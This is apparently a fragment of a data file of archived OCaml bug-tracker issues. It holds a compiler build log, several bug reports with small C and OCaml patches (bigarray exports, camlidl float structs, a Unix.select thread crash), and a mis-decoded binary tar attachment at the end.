bytecomp/symtable.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytelink.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytelink.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytelibrarian.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytelibrarian.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytepackager.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytepackager.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/pparse.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/pparse.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/errors.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/errors.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/compile.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/compile.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/main_args.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/main_args.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/main.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c driver/main.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot  -o ocamlc utils/misc.cmo utils/tbl.cmo utils/config.cmo utils/clflags.cmo utils/terminfo.cmo utils/ccomp.cmo utils/warnings.cmo parsing/linenum.cmo parsing/location.cmo parsing/longident.cmo parsing/syntaxerr.cmo parsing/parser.cmo parsing/lexer.cmo parsing/parse.cmo parsing/printast.cmo typing/ident.cmo typing/path.cmo typing/primitive.cmo typing/types.cmo typing/btype.cmo typing/oprint.cmo typing/subst.cmo typing/predef.cmo typing/datarepr.cmo typing/env.cmo typing/typedtree.cmo typing/ctype.cmo typing/printtyp.cmo typing/includeclass.cmo typing/mtype.cmo typing/includecore.cmo typing/includemod.cmo typing/parmatch.cmo typing/typetexp.cmo typing/typecore.cmo typing/typedecl.cmo typing/typeclass.cmo typing/typemod.cmo bytecomp/lambda.cmo bytecomp/printlambda.cmo bytecomp/typeopt.cmo bytecomp/switch.cmo bytecomp/matching.cmo bytecomp/translobj.cmo bytecomp/translcore.cmo bytecomp/translclass.cmo bytecomp/translmod.cmo bytecomp/simplif.cmo bytecomp/runtimedef.cmo bytecomp/meta.cmo bytecomp/instruct.cmo bytecomp/bytegen.cmo bytecomp/printinstr.cmo bytecomp/opcodes.cmo bytecomp/emitcode.cmo bytecomp/bytesections.cmo bytecomp/dll.cmo bytecomp/symtable.cmo bytecomp/bytelink.cmo bytecomp/bytelibrarian.cmo bytecomp/bytepackager.cmo driver/pparse.cmo driver/errors.cmo driver/compile.cmo driver/main_args.cmo driver/main.cmo\ncd yacc; /usr/bin/make all\nmake[2]: Entering directory `/home/luther/ocaml-3.06/yacc'\nmake[2]: Nothing to be done for `all'.\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/yacc'\ncd lex; /usr/bin/make all\nmake[2]: Entering directory `/home/luther/ocaml-3.06/lex'\n../boot/ocamlyacc -v parser.mly\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A syntax.mli\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A parser.mli\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A parser.ml\n../boot/ocamlrun ../boot/ocamllex lexer.mll\n73 states, 1272 transitions, table size 5526 bytes\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A lexer.mli\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A lexer.ml\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A lexgen.mli\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A lexgen.ml\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A compact.mli\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A compact.ml\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A output.mli\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A output.ml\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A main.ml\n../boot/ocamlrun ../boot/ocamlc -I ../boot  -o ocamllex parser.cmo lexer.cmo lexgen.cmo compact.cmo output.cmo main.cmo\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A syntax.ml\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/lex'\ncd tools; /usr/bin/make all\nmake[2]: Entering directory `/home/luther/ocaml-3.06/tools'\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A -I ../utils -I ../parsing -I ../typing -I ../bytecomp -I ../asmcomp -I ../driver -nostdlib depend.mli\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A -I ../utils -I ../parsing -I ../typing -I ../bytecomp -I ../asmcomp -I ../driver -nostdlib depend.ml\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A -I ../utils -I ../parsing -I ../typing -I ../bytecomp -I ../asmcomp -I ../driver -nostdlib ocamldep.ml\n../boot/ocamlrun ../boot/ocamlc -I ../boot -I ../utils -I ../parsing -I ../typing -I ../bytecomp -I ../asmcomp -I ../driver -o ocamldep misc.cmo config.cmo clflags.cmo terminfo.cmo linenum.cmo warnings.cmo location.cmo longident.cmo syntaxerr.cmo parser.cmo lexer.cmo parse.cmo depend.cmo ocamldep.cmo\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A -I ../utils -I ../parsing -I ../typing -I ../bytecomp -I ../asmcomp -I ../driver -nostdlib ocamlprof.ml\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A -I ../utils -I ../parsing -I ../typing -I ../bytecomp -I ../asmcomp -I ../driver -nostdlib profiling.mli\n../boot/ocamlrun ../boot/ocamlc -I ../boot -c -warn-error A -I ../utils -I ../parsing -I ../typing -I ../\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1520\n**Reporter:** administrator\n**Assigned to:** @maranget\n**Status:** closed (set by @xavierleroy on 2011-05-29T10:19:45Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nOne thing that I find enormously useful is being able use the \"i\"\r\ncommand in emacs info to jump to the documentation for a specific\r\nfunction or feature.\r\n\r\nWhen given an \"i\" command to the emacs info when in the ocaml info dir\r\nreleased with 3.06, I get \"No index\".\r\n\r\nCould this be fixed?\r\n\r\nThanks much.\r\n-- \r\nGreg      gregs@ai.mit.edu (617)253-5807\r\nSullivan  http://www.ai.mit.edu/~gregs/\n"},{"labels":["bug"],"text":"**Original bug ID:** 1519\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n> Bonjour,\n> \n> Il me semble que certains fichier nÃ©cessaires Ã  la crÃ©ation de DLL\n> utilisant les bigarrays ne sont pas installÃ©s pour le port Mingw.\n> \n> D'aprÃ¨s ce que j'ai compris, on a libcamlrun.a qui est une\n> bibliothÃ¨que statique, ocamlrun.a la bibliothÃ¨que dynamique et\n> ocamlrun.dll le DLL. Les deux premiÃ¨res sont installÃ©es dans\n> $OCAMLLIB, la troisiÃ¨me dans le $PATH.\n> \n> Par contre pour bigarray, on n'a que la lib statique dans $OCAMLLIB et\n> le DLL dans $OCAMLLIB/stublibs. La lib dynamique est effacÃ©e aprÃ¨s la\n> crÃ©ation du DLL. Or, on en a besoin si on veut faire un DLL stub\n> utilisant les bigarrays (pour `alloc_bigarray'), non ?\n\nBonjour,\n\nJe vois que le Makefile a Ã©tÃ© modifiÃ© mais il faut aussi dÃ©clarer en\nCAMLextern `alloc_bigarray' et `alloc_bigarray_dims' il me semble.\n\n-- \n   Olivier\n\n\n----------------\nIndex: bigarray.h\n===================================================================\nRCS file: /caml/ocaml/otherlibs/bigarray/bigarray.h,v\nretrieving revision 1.5\ndiff -u -r1.5 bigarray.h\n--- bigarray.h\t2002/02/10 17:01:27\t1.5\n+++ bigarray.h\t2003/01/13 14:29:33\n@@ -68,8 +68,8 @@\n \n #define Data_bigarray_val(v) (Bigarray_val(v)->data)\n \n-extern value alloc_bigarray(int flags, int num_dims, void * data, long * dim);\n-extern value alloc_bigarray_dims(int flags, int num_dims, void * data,\n+CAMLextern value alloc_bigarray(int flags, int num_dims, void * data, long * dim);\n+CAMLextern value alloc_bigarray_dims(int flags, int num_dims, void * data,\n                                  ... /*dimensions, with type long */);\n \n #endif\nIndex: bigarray_stubs.c\n===================================================================\nRCS file: /caml/ocaml/otherlibs/bigarray/bigarray_stubs.c,v\nretrieving revision 1.15\ndiff -u -r1.15 bigarray_stubs.c\n--- bigarray_stubs.c\t2002/10/17 14:43:09\t1.15\n+++ bigarray_stubs.c\t2003/01/13 14:29:33\n@@ -85,7 +85,7 @@\n    [data] cannot point into the Caml heap.\n    [dim] may point into an object in the Caml heap.\n */\n-value alloc_bigarray(int flags, int num_dims, void * data, long * dim)\n+CAMLextern value alloc_bigarray(int flags, int num_dims, void * data, long * dim)\n {\n   long num_elts, size;\n   int i;\n@@ -121,7 +121,7 @@\n /* Same as alloc_bigarray, but dimensions are passed as a list of\n    arguments */\n \n-value alloc_bigarray_dims(int flags, int num_dims, void * data, ...)\n+CAMLextern value alloc_bigarray_dims(int flags, int num_dims, void * data, ...)\n {\n   va_list ap;\n   long dim[MAX_NUM_DIMS];\n\n----------------\n----------------\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1517\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n\n## Bug description\n\nFull_Name: Daniel BÃ¼nzli\nVersion: ocaml 3.06/ camlidl 1.04\nOS: macos 10.2.3\nSubmission from: dialin-client-62-2-142-120.hispeed.ch (62.2.142.120)\n\n\nDear Bugmaster,\n\nThe conversion function from C to ocaml of structs with fields of floats only\nseems to be badly generated by camlidl. To give the simplest example, the\nfollowing idl declaration :\n\ntypedef struct {\nfloat x;\nfloat y;\n} point;\n\ngenerates this C code :\n\nvalue camlidl_c2ml_struc_point(point * _c2, camlidl_ctx _ctx)\n{\nvalue _v1;\n  _v1 = camlidl_alloc_small(2 * Double_wosize, Double_tag);\n  Store_double_val(_v1, (*_c2).x);\n  Store_double_val(_v1, (*_c2).y);\n  return _v1;\n}\n\nWhich has the annoying property of generating points in ocaml whose second\ncoordinate is projected on the x axis.\n\nThe following change in the function `convert_fields' defined for the special\ncase of structures of floats only seems to give me more expectable results.\n\n> diff -rcs camlidl-1.04/compiler/struct.ml camlidl-1.04/compiler/struct.ml.bug\n\n*** camlidl-1.04/compiler/struct.ml     Sun Jan 12 23:13:17 2003\n--- camlidl-1.04/compiler/struct.ml.bug Mon Jan  6 00:46:57 2003\n***************\n*** 101,107 ****\n          let rec convert_fields pos = function\n            [] -> ()\n          | f :: rem ->\n!             iprintf oc \"Store_double_field(%s, %d, %s.%s);\\n\" v pos c\nf.field_name;\n              convert_fields (pos + 1) rem in\n          convert_fields 0 sd.sd_fields\n        end else begin\n--- 101,107 ----\n          let rec convert_fields pos = function\n            [] -> ()\n          | f :: rem ->\n!             iprintf oc \"Store_double_val(%s, %s.%s);\\n\" v c f.field_name;\n              convert_fields (pos + 1) rem in\n          convert_fields 0 sd.sd_fields\n        end else begin\n\n\nDouble check this, given my poor understanding of the ocaml/c interface.\n\nBest regards,\n\nDaniel\n"},{"labels":["bug"],"text":"**Original bug ID:** 1516\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nthe following is also in the attached source package\n---\nI believe I have found a bug in the Unix.select function. For some\nreason, I cannot seem to be able to call it when the client\n(bug_client.ml) is compiled and linked with thread support turned on.\n\nTo demonstrate the problem, first make both projects (server.mak &\nclient.mak) and run the server (bug_server). Next run the client\n(bug_client). On Red Hat 8.0 and OCaml 3.06, the client will crash on\na segmentation fault. I remember having the same problem on Windows\ntoo, but unfortunately I am not able to compile the sample on Windows\nright now.\n\nIf the client is not compiled with threads support on (comment\nTHREADS:=true line in client.mak), the client will function as\nexpected.\n\nIf this is a library conflict, then it would be nice if the ocaml\nlinker would complain about this.\n\nAnyway, I have managed to use select with threads, but I don't\nremember the exact configuration that made it work. This was part of a\nbigger program (a debugger client for a custom bytecode emulator) and\nit is hard for me to provide as a small example. However, with threads\nworking, I found out that using Pervasives.flush_all () also caused\nsegmentation fault. In that project, replacing flush_all with\nPervasives.flush stdout fixed the problem.\n\nI am using GCC 3.2. The ocaml compiler is built by me.\n\nciao,\nJanne Hellsten - jjhellst at cc dot hut dot fi - www.hybrid.fi\n\n----------------\n\u001fâ¹\b\bVÂ­!>\u0000\u0003sock_select_bug.tar\u0000Ã¬<ksÃÂ¶Â²Ã¹jÃ¾\nTq&bb=Ã¬8ÃTÂ­{ÃªÃrÂ£SYÃXNÃ«LÃÃCâ?Ãâ \"yH*Â¶g:Ã·Â·ÃÃ\u0005@\u0002\u0014eÂ§Â­âºÃ3Â§j+\u0013Ã Ã®bÂ±o<Ã,Ã¶>8\u0019\u000fÂ¹â;âÂ«Â«ÃÂ£?Ã¡ÃÃ­Ã®w_Â½z\tÂ»ÃW\u0007Ã»Ã_Ã¹y\u0004\u001dÂ»Ã\u0017{\u0007/Ã·\u000e\u001euw_Ã¬u\u000f\u001eÂ±â\u00063ÃÃ*ÃÃâÂ±GÂ¿Â¸QÃÃ¯â¬Â»Ã¯Ã½Ã¨'Â«Ã¨\u001fÃ¾sÂ¼0Ã QÃ^â \u000f4FwÂ·Ã=Â¨Ã¨]ÃÃ¿â¹WÂ¯\u000e*ÃºypÃ°Ã²\u0011Ã«>ÃÃ¸w~Ã¾ÃÃµo5Å¸Â±#âÂ¤Ã±UÃª.Y\u001e3Å¸/Ã£(ÃÃ²ÃÃ9Ã\u0017ÅMyÃºÃÃâ?<kÃÃUÂ¶pÃ0lÃ\f\fâ¦Ã\u0011Â³Ã3Ã¶c\u0010Ã¹Ã±uÃ\u0019\u0005ÃÃªÂ¦?=Ã¸ÃÃ*_Ãi?Ã½\u0013\u0005ÃÃÃ°0Ãr\u001eÃ­Â°=Ã8\u0002!ÃÃ¶ÃÃ¯Â±NÃÃ§IÅwV\u0019OÂ³\u000eÃÂ¹Ã£Â¹Ã\u0010FÃÃ\u001eÃ¹\rÃ·Ã\u001a\u001fÃ¯Â²mÃ¶ÃÂ¶Â¬?Ã§ÅXâ¢Ã¥~Â¼Ã\u0019pshÂ±5FYFÂ¯-+NxÃÂ¦i\u0010Ã¥sÃ±Ã¼6\nn,ÅÃ¹Ã &\tcÅ¸3\u0017`Ã¡Ã½\u0015\u0003Ë\u0018Za?Ã¥,Å¾ÃÃ\fGÃAÂ¹\u0004â¡nÃ¦ÃËÃ\u000bÂ­\u0011\u0010=d3ânâ¡<ÂºÃ\u0017\u0004\u0014D\u0012&Ã¥\u001e\u000bÃ£8aÃ³ \u0005ÃÃ*\u0005Ã´-|\u0013Ã±âº\u001cpÂ±Ã§9ÃEÅÂ­`NÃÂ¯\u0015eÃ\u0002Ã´2\u0016\u0010CÃ­Å¸Ã Ã¥ÃË\"_lÃqÂ³Ã%\r*â h\u0012Ã¡âhÃÂ¬Ã\u0013Ã£S/~!A\u001ef\u001cÃ°5ÃÅ¡@Ã»Ã¹Â®mmÃ¡+Ã¶ÃÃr\u0006\bÃe]!ÃºâÂ»>Â¨Å¡g\fÆ\u00070\"Ã§xÂ¹Å¡\u000b9\u001cÃ¬â\u0013â¡ÃR2\u001eÂ âU?\u0005tkD\u00131ÃÃ³V(\u00177\u0003SÃ)<â4Â¿&\u001cÃ»+)2Ã¤\u0000Â¨Ã\u001fÃ¢\u0001Gâ°\u0014\u0003Râ\nJÃ¶*!ÃPÃ\bâ-^ÃÂ¬IÃ>\u0017\b6âsÂ¯Ã´\u0006\u0011\u0003{â°Ã(Â¼â¦âºfbÃ°gÂ¶Å¡|t&FSÂ¢\u0012Ã³C6Ã¨Ã7ÃÆ\u001c\u0014&ÃÃââ Ãw\u0005Â ÃÅ¾Â¾?Å¾ZB5 !Ã±EÅ\u0015VNm\u0014ÃºVÅ¾ÃÂ²+Å¾Ã£ÃÃ[ÃÃ·SÃ\u0004Â­Ã¤\u000e>:Ã±Ãâ&ÃÃÃ{ÃÃ®Ã?Â»\râº]\u0007Ã¹\u0002Â¥0Å½sg\u001eÂ¯\"Å¸ÂµÂ¾\u0001R[IÃÃÃÃ¡â\u001f\u0002\tÃÂ \u0001Â£\u0018Ã\faÃ0e\u000eRÃÃÃ]r\u0016Â§\fÅâ¢\rÂ§\fÃÃ¢YÃnâ¬jÂ¶Ã¸M?\u000b\u0013fl!9w?$Å¸?gÃ²Ã´\u0014\u0000ÃÂ«Ãl\u0000\b$:\u0005YâÃ¿\u0001#Ã¨Ã¥Â«Å|âÃÃRÃÂ£Ã³Ãi\u00131Iâ \u0011Â§(\u00073\u0014\u0000#ÃÃÃ\tÃ½a\r\u0004Ã¬Â±'ÃÃ»Â¨!?\nÃ[Ã)\u001fFÃ*'cÅ¡Â³<]ÃÂ·Ãâ¹ Ã¤Ã¬â¹\u0012Ã?â¦Ã­5ÃÃºÂ³|ÃÃq@!LÂ¤NÃ¶\u0013ÃÃ©gt\u0018Ã¸\u0017â-\u001cÂ¹Â¹tsoÃ$Å \u0014Ã¾Â¯\b\u0002R/iÃ·\u000eÃÃ%WÃ¼â¢ÃÃ+tI\u0018*$\u001f;ÃÃ¼Â­9âÂ¸Ã^Ã¸Ã¬Ã&Ãºj\u0000\u0001)Ã\u0017Ã´âº65nÂ¤â Â·\b7ÃAÂ°ÃÃ¹\n|\rÃ»Mâ°ÂºÂ¶Â âÂºÂ¬HÃF\u001dÃ¸qÃÃ¡?ÃÃ¬Ã\u0005â@%â\u0019\nÃ\u0014Ã¦qÂ¨Ã\u001cx3(7â°S\u00142xÃ±KÃA\u0016vXX6Ã\u0006i?\u0019â¹Ã®Ã¶BX2ÃÃ¢vÂ³k\u000b<\u0019rÃ°\u000fâ¬OOÅÃ¡xpÃfâÃ¾Ã·ÃÃ¬Ã¼lpt*\\oÃâ¹!?â¬b\bÂ¾yt||F?M$Â¹CÃ¬Ãh*\u001bÃ­\u0013m\u0000Ã¥ÃÃÂ¯â.ÃÃ¸Ã¥â¬ââ¬Ã­7=Ã°Ã \u001d\u0010Â¢â¡6@Ã¢eLYÃÃ»Ã¨I\u0006Ãª\u0004Ã³Ã±â¢Ã!$k\u0012\u0015\"Ã (ÃF:ÃEâ°}\u001bÂ¯XÂ¶ËW!Ã\u0014ÃªâÅ2Â°Ã´\u0007ÃÂ¶$F\u0014\"Ã\u0019Ã\rIL0\u0002â Ã¯Ã#â \u001dÃ\u0014Ã²?Ã`?U$Â¦Å ~Ã¦Ã±$\u000fÃ¢Â¨ÃÂ°ÃªÃ«?1ÃgÂ«Ã¿Ã¶Ã¶w_UÃ«Â¿WÃÃ½Â¿Ã«Â¿ÃÃ±Â¹Â·Ã¼Æwâ!_â7?'HÃÃT\rwÂ¾\b2\u0006Ã¿Ã¾\u0002ââÂ¨Ã¢Â¯âÃ[eÂ²@0Ã£Ã¤ÂµKÂ¬Å¡VÃ³9vâ¢V,\u000bÃÃËÃ¿Ã¼Ã¢Â±,\u0000ÃµÂ²?BÅ¡\u001eÂ¤Â¨#+2â¢ÃÂº3Ã¶\u0000(F)\u0019ÃÃ®IÃ\"Ã\\\u0006(Â JÅbâ¢@Ã@Å½9ÃÃâ°bd6qÃ\u0006og\u0003ÃÂ¡Ãâ¦P\u0018,aV\u0002b?Ã°(Å¡ÃtÂ XphÅ½ÃÂ´DÃºÂ¸\u0012Â¤)vÃÂ«\"Ã²iÃ¼8â\u0019\f-Ã¸PÂ¾;\u001e^Ë?Sâ \u001b?dCU?\u001e\u0011wÂ®SHBeÃ\u0016ÃÃ§05\u0010\u0016FI\fKDÂ¸+3\u0018>C=?IâÃâ¡j-$âSÂ©YO,\u0014UÂ ÃÂ¨\u001bÂ´)\u0001Å¸\u0017Â´Â \fÂ¤qÃ\u000eÃvÃ)OYeËÂ¾vÆ\u001c\u00159â¡L Â³\fp?â°8Â¼Â¾\nÃÃ¥\u0012â¢%âÃ·Â¦X\\Ãâ¬â\u001d2\u0013,\"Â ÃÃ¤JÂ¯ÃâÃªÃªfÂ¨Â«Ã¥Ã?&?%KâÃÂªÃºÃ\u001eYâ¬)v\u0005mÃ®+Ã¾4qâÂ¬Â°\u0006D\u0000Ã´Ãâ¦âºcÃÃªÂ²ÃÃÂ¯Å 2ËÃ\",â¬dUTâÂ´ÃÃÃ¤Ã¨=Y?kTEa{Â°OÃ¹I.â¢ÃfÂµ+\u0012vÃÂ± Ã·$@FÃXâÂ¿QÂ°D;ÃÃ±Â¿ÃÂ¿Ã%âÂµ%Ã«\u0015Ã¼C3_Â¬Â ÅÂ¹Å½t\u000eÃÃ¬ÃÃÃ³Ã£Ã?cg6\u0018\u001f[Ã_\u001dÅ½?Ã»Â§Å¡Ã¿ÃÃ?Ã»Ã¡Ã¡ÃÂ¸'Ã¿w_Â¬Ã§Ã¿ÃâÃ§Ã¿ÃÃ²Â±fâÂ·gÃ½ÃÂ¬â¡\u000bemÃ«Ã:\u001bÃÃÅ½Ãâ¢ÃoY?!uzÃ±r\t\rvÃ¾\u0006rÃÃ±\f3:Ëâ¹Â¨\u0016\u0004\u001cÃ³R7[`vâÃ\u001dÃ¨Âªy\fÃÃÃzâÃÃ­\u001dbl\u0001Â²Â£Ã¡Ã«ÃÃ³Ã\u0015Ã­Ã\u0000pÃÃ§0j\u000bÃ«cÃj\u0005â\u0017Â®`ÃÃÃ®LÃº?ÃOaÂ°9\u0004\"ÃJWQÃÃjwÂ¶âºâ[Ã»Â¿ÃÃ¿Ã¨Â§ÃªÃ¿ÂªÃ¶Ã¿ÅÃ¾Â¿Ã»rÂ¯ÃªÃ¿{ÃÃÂ¿Ã½Ã¿s|*Ã¾_,Ã½*Ã¾/ÃºÂ­ÂªÃÃ¾Ã­Å¡Ã¿Ã©Å¸ÂªÃ¿\u001bj|Â 1ÃÃ¿Ã·Ã·7Ã¹Ã¿Ã¾ÃÂ½\u0017Ã»UÃ¿yÃ°Ã¢oÃ¿Ã¿\u001cÅ¸Ã\u000fÃ·?Ã´~Ã§ÃÅ\u00105ÃÃ½8Â¹MÆÂ«\u0005Â¬âÃº6ÃÃ½Ã²Ã/[Â°\u0016ÃcÃ¬ÃM?Â¬2v\u001aÃ§yhÃ7Ã\tÃ®N'>,-2(7xo\u001d|âÃ§IÂ¯ÃÂ¹Â¾Â¾nÃ\u001cÃÂ¬m7Ã¯Ã¼Ã¯âÃÃ¨ÃÂ¸yÃ dÃ±*ÃµxÂ¦?EÂ»\rÃ\u0014v>Â²Ã6Ã½Æ[\u0006{?Ã®â?\u0017]ÃÃ½Â²Â·Â¿ÃÃÃgd0xÃÃÂ¶âÃ\u0003Ã\u0019ËÅ¡qÃ\u001aÃ8Ã»Ã¨Â¦?{\u0019ÃdÂ¡\u000eÃ\u0012\fÃÃ\u0019Å¾SÃÃÂ¡Ë\bÂ¾Â»Â¤Â½\u001chdÃÃE#PAËâgÂ«0/ÃÂ´Ã$ÃµqÃ³Ãâ¦EpÅ¡1EÂ»\u0016a\u0010}pÂ¯Ã¸\u0017â\u0015Ã#\u001fVâ¢2mÃÂ²J>Ã.v\u001ccÃªÃ â\u001fÃ-~C{\r\nP!B:pÃºPÃ®9Â³Â·'â¬Â­7âââÃ¥Â«ÃÃ$aÂ ht Â­\b\n2QÃÃ°kË\bÂ£PÅ½'}Ã§d8\"Â®â¹gDÃnâ>qgÃ¼\tÂ°\u001fÃ¬@[rmÃ&ÃââÃªyÃ\u0007Â¦Nâ \u0017Âª=Vm5Ã¨Ã¹d*{XÃ¹ÅÆÂ¶Ã³8âÃ\u0015r\t\u000bÃ\u0019|âJz\u0005Ã0Ã®Â¦Ã¥LfÃâXÃ¿\u0007âÂ©âºÃÂ¶\u00127_d;Â²\u0019\b=Â£Âªv\u0000ÃÃµÃ½\u0000w&Ã?AÃÅ¾\u0004Â¡â¹Â­Ã\u000e\u0001\b2dÃ¬Â·Â®Ã§ÂµÃ¦Â¡{\u0005Ã¦ÃÂ¦@Ã\u0018\u0002Ã?ÃÃ©âpYÃÂ¹Å¸ÃÂ¹\u0010\u0018âÃâ\u0011\u001b>Â­aÆÃÂ²â¢Â·hÂ·Ã@Ãª\u0018Å\u0004\u001c@Â­\u0012â9ÃÃm$Ãâ|â¡Ã`|Ã©u\u0000\u0016\u001crÃ·#â¡>Â¶Å pÂ¢Ã\fÃ·Â¡`P\\lÃ\u0006NÃ¿Ã¨t4ÃÂ·Â¿(Â¥$(Âªf\tS@\fÃÃ½Ã£Ã¡Y\u0001\u0001Â¦Â£7'\bÃ­\u001c\u000fNÅ½Ã8ÅÃµ7hiÃÃ±Ã¬Ã¼h4Â²4\u0012\u0005TÅ¸\u001a\u0006ÃÃÃ¨Ã¨;âÃÂ¸Â¿ÃÃ·ZÃ¶\u0019?Â£Ã£\u001aÃ¤ÂºÃÃÂªSY\u0016ÃµÃ¶Â§Â¢â\u0019MÂ´/Â·b\\\u0006Â¸Ãª|gÅ3<\u001eÃp\bFoÃ¶\u001eÃ¿0ÅÃÃ.?ÃÃ¹Â°?f{Ã¤Ã»Ã\u0001zÅH\u0013ÃiEËa3Â£]&uÃ\u0001â Ã¤CÃµâÆU\\ÃÂ²\u0006-$=Â°ËÂ¨QÂ¨Ã»Ã¬hÃ¶ÃÂª\rÂ Lâ¹~>OpÂ¾\u0011ÃJ\u0000KKEÂ°â \n\u0015\u0012|(Å\u001fEâ¡â;\u001dÅ½Â¿Ã»\u0011\u000fYÃ\bÂªÃ¹Ã£pÃ¼\u0002Â²\r\noW\nOÃÃ~Ã¨kÃ Â¢e@36Â¸8w&Â¯Ã¿â°ÃÃ¸Ã²\u0017Ã\u0001ââ\u001dÃ Kt\u0018ÃÃ¿ÃÅ¡ÃÃ~ÃÃÂ¹Ã²<âºÃ¶'\u001fÂ³Ã«8Ã½ÃÃâ\u000ecÂ¿\u001bÂ¿eË^`6sWâÃ¥pÃ\tÂ°ÃGJ^Ë|\u0010k\u001aÃâ¹\u000bÂ Ã¸Ã¼Ã¹oÂ¥xqÂ±Fâ4Ã­LÂ°Â¿u\u0012\u001bBÂ Ã¹Ãy)Ã$Â¡Å½\u0001eHÅiÃ¼â +Â³âV*Ã¥RâPAÂ¹â¬\u0001Qâ¢BsÃa`Ã\n\u0003^\u0015h \u0019ââ?\u0019_&Ã¹Â­\t!'Xâ¢j\fÃ~LâMX#Ãh?1ÂµÃÃL KÃ¢\n(C;\u000eBÂ´Â²Ã«E\u0000\u0015FÃ¢z\u001cBâÃ©iÃ½~Ã±tQ$\u00063\u001eÃ\u000bÂ£]Ã¸Ã¶Ã«Â¾Ãg\"/A\u0010ÃVÃ³yp\u0003Ã*ÃÃËÂ Ã¤ÂªÃÂ¶Ãâº\u0011ÃÂµ\b?dÃâi\"\u0014Ã¹ÃÃ0\u0003N\u0011jHâËAÂ¼ÃHcÂ¢MÂ¦Ã§\n\u0011\u001e\u000bTË\u000fuÃ\bmÂ Å¸~\u000fÂ¼)\u0002Ã(H,?Â¬'R\rÂ§\u0012-Ã@YÂ²_â¹ÃÂ¯Â \u001e\u000f\n\\x,?!Ã¬Ãa#Â´?>\u001a\\(tx,ÃC~Sâ¡Å½Ã\u0006ÃºÂ»Â£~!x|.\b`Ã¶Â®Â£@\bâ¦ÃC\u0007Ãv4zÃ±DÂ¾\u0003Ã?\u001fVmWâVP?G\u001a644\u0002~Â¸?\u0006Ã¢(2Ã£\ttÂ¼?Â´=8\u0003:Â§GÃ¯^\u000f\u001cÃ¨qD\u0017Ã¹Ã 